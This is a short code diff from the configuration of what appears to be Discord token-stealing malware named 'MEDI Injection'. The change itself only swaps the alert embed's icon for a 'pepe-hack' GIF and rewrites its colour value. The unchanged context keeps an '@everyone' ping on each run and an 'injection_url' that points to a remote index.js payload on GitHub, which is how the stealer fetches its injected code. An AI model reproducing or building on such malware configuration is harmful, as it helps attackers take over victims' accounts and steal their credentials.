@@ -12,8 +12,8 @@
     ping_on_run: true, 
     ping_val: '@everyone',
     embed_name: 'MEDI Injection', 
-    embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
-    embed_color: 2895667, 
+    embed_icon: 'https://media.tenor.com/XXAXt1WWm3YAAAAi/pepe-hack-hack.gif', 
+    embed_color: 0x00FFFF, 
     injection_url: 'https://raw.githubusercontent.com/MEDIYouTube/index/main/index.js', 
     /**
      
